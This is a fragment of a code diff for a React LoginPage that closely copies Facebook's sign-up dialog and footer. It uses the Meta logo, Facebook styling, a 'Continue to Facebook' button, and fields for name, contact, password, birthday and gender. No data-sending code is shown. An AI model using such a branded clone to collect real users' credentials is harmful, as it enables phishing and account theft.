+                style={{ backgroundColor: '#1877f2' }}
+                data-testid="button-continue"
+              >
+                Continue to Facebook
+              </button>
+            </div>
+          )}
         </div>
       </main>
 
-      {/* Footer */}
-      <footer className="mt-auto py-6 px-4" style={{ backgroundColor: '#ffffff' }}>
-        <div className="max-w-7xl mx-auto">
-          <div className="mb-2">
-            <img src={metaLogoImg} alt="Meta" className="h-5 opacity-60" />
-          </div>
-
-          <div className="flex flex-wrap gap-x-4 gap-y-1 text-xs mb-2" style={{ color: '#8a8d91' }}>
-            <a href="#" className="hover:underline">English (UK)</a>
-            <a href="#" className="hover:underline">മലയാളം</a>
-            <a href="#" className="hover:underline">தமிழ்</a>
-            <a href="#" className="hover:underline">ಕನ್ನಡ</a>
-            <a href="#" className="hover:underline">हिन्दी</a>
-            <a href="#" className="hover:underline">বাংলা</a>
-            <a href="#" className="hover:underline">తెలుగు</a>
-            <a href="#" className="hover:underline">मराठी</a>
-            <a href="#" className="hover:underline">Español</a>
-            <a href="#" className="hover:underline">Português (Brasil)</a>
-            <a href="#" className="hover:underline">Français (France)</a>
-            <button className="px-1.5 py-0.5 border rounded text-xs" style={{ borderColor: '#ccd0d5', color: '#65676b' }}>
-              <span className="text-sm leading-none">+</span>
-            </button>
-          </div>
-
-          <div className="border-t pt-2" style={{ borderColor: '#dadde1' }}>
-            <div className="flex flex-wrap gap-x-4 gap-y-1 text-xs mb-2" style={{ color: '#8a8d91' }}>
-              <a href="#" className="hover:underline">Sign Up</a>
-              <a href="#" className="hover:underline">Log In</a>
-              <a href="#" className="hover:underline">Messenger</a>
-              <a href="#" className="hover:underline">Facebook Lite</a>
-              <a href="#" className="hover:underline">Video</a>
-              <a href="#" className="hover:underline">Places</a>
-              <a href="#" className="hover:underline">Games</a>
-              <a href="#" className="hover:underline">Marketplace</a>
-              <a href="#" className="hover:underline">Meta Pay</a>
-              <a href="#" className="hover:underline">Meta Store</a>
-              <a href="#" className="hover:underline">Meta Quest</a>
-            </div>
-
-            <div className="flex flex-wrap gap-x-4 gap-y-1 text-xs mb-2" style={{ color: '#8a8d91' }}>
-              <a href="#" className="hover:underline">Instagram</a>
-              <a href="#" className="hover:underline">Threads</a>
-              <a href="#" className="hover:underline">Fundraisers</a>
-              <a href="#" className="hover:underline">Services</a>
-              <a href="#" className="hover:underline">Voting Information Centre</a>
-              <a href="#" className="hover:underline">Privacy Policy</a>
-              <a href="#" className="hover:underline">Privacy Centre</a>
-              <a href="#" className="hover:underline">Groups</a>
-              <a href="#" className="hover:underline">About</a>
-              <a href="#" className="hover:underline">Create ad</a>
-              <a href="#" className="hover:underline">Create Page</a>
-            </div>
-
-            <div className="flex flex-wrap gap-x-4 gap-y-1 text-xs" style={{ color: '#8a8d91' }}>
-              <a href="#" className="hover:underline">Developers</a>
-              <a href="#" className="hover:underline">Careers</a>
-              <a href="#" className="hover:underline">Cookies</a>
-              <a href="#" className="hover:underline">AdChoices</a>
-              <a href="#" className="hover:underline">Terms</a>
-              <a href="#" className="hover:underline">Help</a>
-              <a href="#" className="hover:underline">Contact uploading and non-users</a>
-            </div>
-
-            <div className="mt-4 text-xs" style={{ color: '#8a8d91' }}>
-              Meta © 2025
-            </div>
-          </div>
+      <footer className="text-center py-6 px-5" style={{ color: '#65676b' }}>
+        <div className="mb-3">
+          <img src={metaLogoImg} alt="Meta" className="h-6 mx-auto opacity-60" data-testid="img-meta-logo" />
+        </div>
+        <div className="text-xs space-x-4">
+          <a href="#" className="hover:underline" data-testid="link-about">About</a>
+          <a href="#" className="hover:underline" data-testid="link-help">Help</a>
+          <a href="#" className="hover:underline" data-testid="link-more">More</a>
         </div>
       </footer>
 
-      {/* Signup Dialog */}
       <Dialog open={signupOpen} onOpenChange={setSignupOpen}>
         <DialogContent className="sm:max-w-[432px] p-0 gap-0 bg-white rounded-lg overflow-hidden border-0">
           <DialogHeader className="p-4 pb-0">
-            <DialogTitle className="text-3xl font-bold" style={{ color: '#1c1e21' }}>
-              Sign Up
-            </DialogTitle>
-            <DialogDescription className="text-sm mt-1" style={{ color: '#65676b' }}>
-              It's quick and easy.
-            </DialogDescription>
+            <DialogTitle className="text-2xl font-bold" style={{ color: '#1c1e21' }}>Sign Up</DialogTitle>
+            <DialogDescription className="text-sm mt-1" style={{ color: '#65676b' }}>It's quick and easy.</DialogDescription>
           </DialogHeader>
 
-          <div className="my-3 border-t" style={{ borderColor: '#dadde1' }} />
+          <div className="my-3 border-t border-gray-200" />
 
           <Form {...signupForm}>
-            <form onSubmit={signupForm.handleSubmit(handleSignup)} className="px-4 pb-6 space-y-3">
+            <form onSubmit={signupForm.handleSubmit(handleSignup)} className="px-4 pb-4 space-y-3">
               <div className="flex gap-3">
                 <FormField
                   control={signupForm.control}
@@ -291,14 +862,9 @@ export default function LoginPage() {
                   render={({ field }) => (
                     <FormItem className="flex-1">
                       <FormControl>
-                        <input
-                          {...field}
-                          placeholder="First name"
-                          className="w-full px-3 py-2.5 text-base border rounded-md"
-                          style={{ backgroundColor: '#f5f6f7', borderColor: '#ccd0d5', color: '#1c1e21' }}
-                        />
+                        <input {...field} placeholder="First name" className="w-full px-3 py-2 text-sm border rounded-md" style={{ backgroundColor: '#f5f6f7', borderColor: '#ccd0d5', color: '#1c1e21' }} data-testid="input-firstname" />
                       </FormControl>
-                      <FormMessage className="text-xs" style={{ color: '#be4b49' }} />
+                      <FormMessage className="text-xs mt-1" style={{ color: '#be4b49' }} />
                     </FormItem>
                   )}
                 />
@@ -308,14 +874,9 @@ export default function LoginPage() {
                   render={({ field }) => (
                     <FormItem className="flex-1">
                       <FormControl>
-                        <input
-                          {...field}
-                          placeholder="Surname"
-                          className="w-full px-3 py-2.5 text-base border rounded-md"
-                          style={{ backgroundColor: '#f5f6f7', borderColor: '#ccd0d5', color: '#1c1e21' }}
-                        />
+                        <input {...field} placeholder="Surname" className="w-full px-3 py-2 text-sm border rounded-md" style={{ backgroundColor: '#f5f6f7', borderColor: '#ccd0d5', color: '#1c1e21' }} data-testid="input-lastname" />
                       </FormControl>
-                      <FormMessage className="text-xs" style={{ color: '#be4b49' }} />
+                      <FormMessage className="text-xs mt-1" style={{ color: '#be4b49' }} />
                     </FormItem>
                   )}
                 />
@@ -327,14 +888,9 @@ export default function LoginPage() {
                 render={({ field }) => (
                   <FormItem>
                     <FormControl>
-                      <input
-                        {...field}
-                        placeholder="Mobile number or email address"
-                        className="w-full px-3 py-2.5 text-base border rounded-md"
-                        style={{ backgroundColor: '#f5f6f7', borderColor: '#ccd0d5', color: '#1c1e21' }}
-                      />
+                      <input {...field} placeholder="Mobile number or email address" className="w-full px-3 py-2 text-sm border rounded-md" style={{ backgroundColor: '#f5f6f7', borderColor: '#ccd0d5', color: '#1c1e21' }} data-testid="input-signup-email" />
                     </FormControl>
-                    <FormMessage className="text-xs" style={{ color: '#be4b49' }} />
+                    <FormMessage className="text-xs mt-1" style={{ color: '#be4b49' }} />
                   </FormItem>
                 )}
               />
@@ -345,102 +901,43 @@ export default function LoginPage() {
                 render={({ field }) => (
                   <FormItem>
                     <FormControl>
-                      <input
-                        {...field}
-                        type="password"
-                        placeholder="New password"
-                        className="w-full px-3 py-2.5 text-base border rounded-md"
-                        style={{ backgroundColor: '#f5f6f7', borderColor: '#ccd0d5', color: '#1c1e21' }}
-                      />
+                      <input {...field} type="password" placeholder="New password" className="w-full px-3 py-2 text-sm border rounded-md" style={{ backgroundColor: '#f5f6f7', borderColor: '#ccd0d5', color: '#1c1e21' }} data-testid="input-signup-password" />
                     </FormControl>
-                    <FormMessage className="text-xs" style={{ color: '#be4b49' }} />
+                    <FormMessage className="text-xs mt-1" style={{ color: '#be4b49' }} />
                   </FormItem>
                 )}
               />
 
               <div>
-                <label className="text-xs font-semibold mb-1 block" style={{ color: '#606770' }}>
-                  Date of birth
-                </label>
-                <div className="flex gap-3">
-                  <select
-                    className="flex-1 px-3 py-2.5 text-base border rounded-md appearance-none cursor-pointer"
-                    style={{ backgroundColor: '#fff', borderColor: '#ccd0d5', color: '#1c1e21' }}
-                    value={signupForm.watch("birthday.day")}
-                    onChange={(e) => signupForm.setValue("birthday.day", e.target.value)}
-                  >
-                    {days.map((d) => <option key={d} value={d}>{d}</option>)}
-                  </select>
-                  <select
-                    className="flex-1 px-3 py-2.5 text-base border rounded-md appearance-none cursor-pointer"
-                    style={{ backgroundColor: '#fff', borderColor: '#ccd0d5', color: '#1c1e21' }}
-                    value={signupForm.watch("birthday.month")}
-                    onChange={(e) => signupForm.setValue("birthday.month", e.target.value)}
-                  >
+                <label className="text-xs" style={{ color: '#65676b' }}>Date of birth</label>
+                <div className="flex gap-3 mt-1">
+                  <select className="flex-1 px-2 py-1 text-sm border rounded-md" style={{ backgroundColor: '#f5f6f7', borderColor: '#ccd0d5', color: '#1c1e21' }} value={signupForm.watch("birthday.month")} onChange={(e) => signupForm.setValue("birthday.month", e.target.value)} data-testid="select-birthday-month">
                     {months.map((m, idx) => <option key={idx} value={String(idx)}>{m}</option>)}
                   </select>
-                  <select
-                    className="flex-1 px-3 py-2.5 text-base border rounded-md appearance-none cursor-pointer"
-                    style={{ backgroundColor: '#fff', borderColor: '#ccd0d5', color: '#1c1e21' }}
-                    value={signupForm.watch("birthday.year")}
-                    onChange={(e) => signupForm.setValue("birthday.year", e.target.value)}
-                  >
+                  <select className="flex-1 px-2 py-1 text-sm border rounded-md" style={{ backgroundColor: '#f5f6f7', borderColor: '#ccd0d5', color: '#1c1e21' }} value={signupForm.watch("birthday.day")} onChange={(e) => signupForm.setValue("birthday.day", e.target.value)} data-testid="select-birthday-day">
+                    {days.map((d) => <option key={d} value={d}>{d}</option>)}
+                  </select>
+                  <select className="flex-1 px-2 py-1 text-sm border rounded-md" style={{ backgroundColor: '#f5f6f7', borderColor: '#ccd0d5', color: '#1c1e21' }} value={signupForm.watch("birthday.year")} onChange={(e) => signupForm.setValue("birthday.year", e.target.value)} data-testid="select-birthday-year">
                     {years.map((y) => <option key={y} value={y}>{y}</option>)}
                   </select>
                 </div>
               </div>
 
               <div>
-                <label className="text-xs font-semibold mb-1 block" style={{ color: '#606770' }}>
-                  Gender
-                </label>
-                <div className="flex gap-3">
-                  {[
-                    { value: "female", label: "Female" },
-                    { value: "male", label: "Male" },
-                    { value: "custom", label: "Custom" }
-                  ].map((option) => (
-                    <label
-                      key={option.value}
-                      className="flex-1 flex items-center justify-between px-3 py-2.5 border rounded-md cursor-pointer"
-                      style={{ backgroundColor: '#fff', borderColor: '#ccd0d5' }}
-                    >
-                      <span className="text-base" style={{ color: '#1c1e21' }}>{option.label}</span>
-                      <input
-                        type="radio"
-                        name="gender"
-                        value={option.value}
-                        onChange={(e) => signupForm.setValue("gender", e.target.value)}
-                        checked={signupForm.watch("gender") === option.value}
-                        className="w-4 h-4 cursor-pointer"
-                      />
+                <label className="text-xs" style={{ color: '#65676b' }}>Gender</label>
+                <div className="flex gap-3 mt-1">
+                  {[{ value: "female", label: "Female" }, { value: "male", label: "Male" }, { value: "custom", label: "Custom" }].map((option) => (
+                    <label key={option.value} className="flex-1 flex items-center justify-between px-3 py-2 border rounded-md cursor-pointer" style={{ backgroundColor: '#f5f6f7', borderColor: '#ccd0d5' }}>
+                      <span className="text-sm" style={{ color: '#1c1e21' }}>{option.label}</span>
+                      <input type="radio" name="gender" value={option.value} onChange={(e) => signupForm.setValue("gender", e.target.value)} checked={signupForm.watch("gender") === option.value} className="w-4 h-4 cursor-pointer" data-testid={`radio-gender-${option.value}`} />
                     </label>
                   ))}
                 </div>
               </div>
 
-              <p className="text-xs leading-relaxed" style={{ color: '#777' }}>
-                People who use our service may have uploaded your contact information to Facebook.{" "}
-                <a href="#" className="hover:underline" style={{ color: '#385898' }}>Learn more</a>.
-              </p>
-
-              <p className="text-xs leading-relaxed" style={{ color: '#777' }}>
-                By clicking Sign Up, you agree to our{" "}
-                <a href="#" className="hover:underline" style={{ color: '#385898' }}>Terms</a>,{" "}
-                <a href="#" className="hover:underline" style={{ color: '#385898' }}>Privacy Policy</a> and{" "}
-                <a href="#" className="hover:underline" style={{ color: '#385898' }}>Cookies Policy</a>.
-                You may receive SMS notifications from us and can opt out at any time.
-              </p>
-
-              <div className="text-center pt-2">
-                <button
-                  type="submit"
-                  className="px-16 py-2 text-white text-lg font-bold rounded-md hover:opacity-90 transition"
-                  style={{ backgroundColor: '#00a400' }}
-                >
-                  Sign Up
-                </button>
-              </div>
+              <button type="submit" disabled={isSigningUp} className="w-auto px-16 py-2 text-white text-base font-bold rounded-md transition disabled:opacity-60 mx-auto block" style={{ backgroundColor: '#00a400' }} data-testid="button-signup-submit">
+                {isSigningUp ? "Signing up..." : "Sign Up"}
+              </button>
             </form>
           </Form>
         </DialogContent>
